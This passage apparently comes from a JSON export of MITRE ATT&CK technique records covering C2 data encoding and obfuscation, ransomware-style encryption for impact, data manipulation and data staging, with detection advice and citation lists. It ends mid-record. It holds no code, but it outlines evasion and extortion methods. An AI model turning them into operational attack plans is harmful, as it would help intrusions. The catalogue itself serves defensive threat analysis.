{"ID":"T1132.002","name":"Data Encoding: Non-Standard Encoding","description":"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) ","url":"https://attack.mitre.org/techniques/T1132/002","created":"14 March 2020","last modified":"14 March 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1132","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Bankshot),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Unit42 RDAT July 2020),(Citation: Securelist ShadowPad Aug 2017),(Citation: FireEye APT30),(Citation: McAfee Oceansalt Oct 2018),(Citation: ESET InvisiMole June 2020),(Citation: NCSC Cyclops Blink February 2022),"}
{"ID":"T1132.001","name":"Data Encoding: Standard Encoding","description":"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.","url":"https://attack.mitre.org/techniques/T1132/001","created":"14 March 2020","last modified":"03 March 2023","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1132","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Unit42 BabyShark Feb 2019),(Citation: McAfee Lazarus Nov 2020),(Citation: Kaspersky Carbanak),(Citation: Crowdstrike Qakbot October 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Fysbis Dr Web Analysis),(Citation: Antiy CERT Ramsay April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET Okrum July 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Fidelis njRAT June 2013),(Citation: Unit 42 Kazuar May 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Bisonal Mar 2020),(Citation: Group IB GrimAgent July 2021),(Citation: Lotus Blossom Jun 2015),(Citation: Kaspersky Sofacy),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: JPCERT ChChes Feb 2017),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Check Point APT34 April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Palo Alto DNS Requests),(Citation: Forcepoint Monsoon),(Citation: Symantec Dragonfly),(Citation: Unit 42 Inception November 2018),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Unit42 Molerat Mar 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Cylance Shaheen Nov 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye APT28),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: GitHub Sliver HTTP),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Unit 42 Valak July 2020),(Citation: Palo Alto menuPass Feb 2017),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Telebots Dec 2016),(Citation: Securelist Octopus Oct 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Forcepoint Felismus Mar 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET ForSSHe December 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: ClearSky MuddyWater June 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Cylance Dust Storm),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit42 RDAT July 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Unit 42 SeaDuke 2015),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: CISA WellMess July 2020),(Citation: FireEye APT33 Guardrail),(Citation: Moran 2013),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Ebury Feb 2014),(Citation: Medium KONNI Jan 2020),(Citation: Securelist Machete Aug 2014),(Citation: ESET Operation Groundbait),(Citation: Microsoft HAFNIUM March 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: Palo Alto OilRig May 2016),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Zscaler Cobian Aug 2017),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cymmetria Patchwork),(Citation: FireEye CARBANAK June 2017),"}
{"ID":"T1486","name":"Data Encrypted for Impact","description":"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)","url":"https://attack.mitre.org/techniques/T1486","created":"15 March 2019","last modified":"16 June 2022","version":"1.4","tactics":"Impact","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.","platforms":"IaaS, Linux, Windows, macOS","data sources":"Cloud Storage: Cloud Storage Modification, Command: Command Execution, File: File Creation, File: File Modification, Network Share: Network Share Access, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"ExtraHop; Harshal Tupsamudre, Qualys; Mayuresh Dani, Qualys; Oleg Kolesnikov, Securonix; Travis Smith, Qualys","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: CarbonBlack LockerGoga 2019),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Palo Alto Unit 42 EKANS),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Secureworks REvil September 2019),(Citation: NHS Digital Egregor Nov 2020),(Citation: Costa AvosLocker May 2022),(Citation: SecureWorks WannaCry Analysis),(Citation: mbed-crypto),(Citation: wardle evilquest partii),(Citation: Secure List Bad Rabbit),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Carbon Black JCry May 2019),(Citation: Unit42 LockerGoga 2019),(Citation: Cybereason Conti Jan 2021),(Citation: KillDisk Ransomware),(Citation: Symantec WastedLocker June 2020),(Citation: Talos Sodinokibi April 2019),(Citation: CrowdStrike Ryuk January 2019),(Citation: Cynet Ragnar Apr 2020),(Citation: Medium Babuk February 2021),(Citation: Unit 42 Shamoon3 2018),(Citation: Cybereason Egregor Nov 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Check Point Pay2Key November 2020),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Uptycs Black Basta ESXi June 2022),(Citation: CERT-FR PYSA April 2020),(Citation: Minerva Labs Black Basta May 2022),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: CarbonBlack Conti July 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: McAfee Babuk February 2021),(Citation: TrendMicro Netwalker May 2020),(Citation: Kroll Royal Deep Dive February 2023),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Intel 471 REvil March 2020),(Citation: Unit42 Clop April 2021),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky Sodin July 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: McAfee Cuba April 2021),(Citation: Mcafee Clop Aug 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Sophos SamSam Apr 2018),(Citation: FireEye WannaCry 2017),(Citation: Deep Instinct Black Basta August 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: US-CERT NotPetya 2017),(Citation: Cylance Sodinokibi July 2019),(Citation: IBM MegaCortex),(Citation: DFIR Phosphorus November 2021),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: LogRhythm WannaCry),(Citation: FireEye Maze May 2020),(Citation: Cisco Talos Avos Jun 2022),(Citation: ClearkSky Fox Kitten February 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cyble Black Basta May 2022),(Citation: Wired Lockergoga 2019),(Citation: Check Point Black Basta October 2022),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: Talos Nyetya June 2017),(Citation: NCC Group WastedLocker June 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: Picus Sodinokibi January 2020),(Citation: Cybereason Royal December 2022),(Citation: Microsoft BlackCat Jun 2022),(Citation: Group IB Ransomware September 2020),(Citation: Dragos EKANS),(Citation: BlackBerry Black Basta May 2022),(Citation: McAfee REvil October 2019),(Citation: Cybereason Clop Dec 2020),(Citation: Joint CSA AvosLocker Mar 2022),(Citation: Sophos Ragnar May 2020),(Citation: FireEye APT38 Oct 2018),(Citation: Cybleinc Conti January 2020),(Citation: CarbonBlack RobbinHood May 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: FireEye FiveHands April 2021),(Citation: NCC Group Fivehands June 2021),(Citation: Trend Micro Ransomware February 2021),(Citation: Trend Micro Royal Linux ESXi February 2023),(Citation: Proofpoint TA505 Sep 2017),(Citation: NCC Group Black Basta June 2022),(Citation: Rhino S3 Ransomware Part 2),(Citation: Ready.gov IT DRP),(Citation: win10_asr)"}
{"ID":"T1565","name":"Data Manipulation","description":"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","url":"https://attack.mitre.org/techniques/T1565","created":"02 March 2020","last modified":"19 April 2022","version":"1.1","tactics":"Impact","detection":"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":",(Citation: Ready.gov IT DRP)"}
{"ID":"T1565.003","name":"Data Manipulation: Runtime Data Manipulation","description":"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","url":"https://attack.mitre.org/techniques/T1565/003","created":"02 March 2020","last modified":"25 March 2022","version":"1.1","tactics":"Impact","detection":"Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1565","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, root, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":"(Citation: FireEye APT38 Oct 2018),"}
{"ID":"T1565.001","name":"Data Manipulation: Stored Data Manipulation","description":"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","url":"https://attack.mitre.org/techniques/T1565/001","created":"02 March 2020","last modified":"19 April 2022","version":"1.1","tactics":"Impact","detection":"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, File: File Deletion, File: File Modification","is sub-technique":true,"sub-technique of":"T1565","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":"(Citation: FireEye APT38 Oct 2018),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Ready.gov IT DRP)"}
{"ID":"T1565.002","name":"Data Manipulation: Transmitted Data Manipulation","description":"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","url":"https://attack.mitre.org/techniques/T1565/002","created":"02 March 2020","last modified":"19 April 2022","version":"1.1","tactics":"Impact","detection":"Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. ","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1565","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":"(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye APT38 Oct 2018),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: ESET LightNeuron May 2019),"}
{"ID":"T1001","name":"Data Obfuscation","description":"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ","url":"https://attack.mitre.org/techniques/T1001","created":"31 May 2017","last modified":"15 March 2020","version":"1.1","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Check Point APT34 April 2021),(Citation: Proofpoint TA505 Mar 2018),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Unit42 RDAT July 2020),(Citation: FoxIT Wocao December 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),"}
{"ID":"T1001.001","name":"Data Obfuscation: Junk Data","description":"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ","url":"https://attack.mitre.org/techniques/T1001/001","created":"15 March 2020","last modified":"15 March 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1001","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye APT28),(Citation: Kaspersky Lyceum October 2021),(Citation: TrendMicro BlackTech June 2017),(Citation: Unit42 BendyBear Feb 2021),(Citation: ESET Sednit Part 3),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CISA WellMess July 2020),(Citation: Securelist APT10 March 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Dell P2P ZeuS),(Citation: Group IB GrimAgent July 2021),(Citation: ESET PLEAD Malware July 2018),(Citation: MSTIC NOBELIUM Mar 2021),"}
{"ID":"T1001.003","name":"Data Obfuscation: Protocol Impersonation","description":"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ","url":"https://attack.mitre.org/techniques/T1001/003","created":"15 March 2020","last modified":"15 March 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1001","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: US-CERT BADCALL),(Citation: Novetta Blockbuster),(Citation: Mandiant APT41),(Citation: US-CERT Bankshot Dec 2017),(Citation: ESET InvisiMole June 2018),(Citation: ESET InvisiMole June 2020),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: US-CERT HARDRAIN March 2018),(Citation: Zscaler Higaisa 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: ESET Okrum July 2019),(Citation: Scarlet Mimic Jan 2016),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: PWC KeyBoys Feb 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee GhostSecret),"}
{"ID":"T1001.002","name":"Data Obfuscation: Steganography","description":"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ","url":"https://attack.mitre.org/techniques/T1001/002","created":"15 March 2020","last modified":"15 March 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1001","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: GitHub Sliver HTTP),(Citation: FireEye APT29),(Citation: ESET Dukes October 2019),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Symantec W32.Duqu),(Citation: Unit42 RDAT July 2020),(Citation: Symantec Sunburst Sending Data January 2021),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ESET LightNeuron May 2019),(Citation: Proofpoint TA459 April 2017),(Citation: Novetta-Axiom),"}
{"ID":"T1074","name":"Data Staged","description":"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.","url":"https://attack.mitre.org/techniques/T1074","created":"31 May 2017","last modified":"20 July 2022","version":"1.4","tactics":"Collection","detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nConsider monitoring accesses and modifications to storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","platforms":"IaaS, Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian; Shane Tully, @securitygypsy","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET Kobalos Jan 2021),(Citation: CrowdStrike Grim Spider May 2019),"}
{"ID":"T1074.001","name":"Data Staged: Local Data Staging","description":"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)","url":"https://attack.mitre.org/techniques/T1074/001","created":"13 March 2020","last modified":"21 April 2022","version":"1.1","tactics":"Collection","detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nConsider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1074","defenses bypassed":null,"contributors":"Massimiliano Romano, BT Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: CyberBit Dtrack),(Citation: FoxIT Wocao December 2019),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2018),(Citation: Antiy CERT Ramsay April 2020),(Citation: Symantec Catchamas April 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Unit 42 Kazuar May 2017),(Citation: Morphisec ShellTea June 2019),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Symantec Calisto July 2018),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: Talos NavRAT May 2018),(Citation: Symantec WastedLocker June 2020),(Citation: Kaspersky Sofacy),(Citation: Cybereason PowerLess February 2022),(Citation: Securelist Calisto July 2018),(Citation: McAfee Gold Dragon),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks Karagany July 2019),(Citation: Cisco Talos Intelligence Group),(Citation: McAfee Honeybee),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto MoonWind March 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Forcepoint Monsoon),(Citation: CISA AA20-301A Kimsuky),(Citation: Malwarebytes Dyreza November 2015),(Citation: FireEye NETWIRE March 2019),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT30),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye TRITON 2019),(Citation: Palo Alto Rover),(Citation: Talos MuddyWater Jan 2022),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Microsoft SIR Vol 19),(Citation: Avira Mustang Panda January 2020),(Citation: Kroll RawPOS Jan 2017),(Citation: FireEye 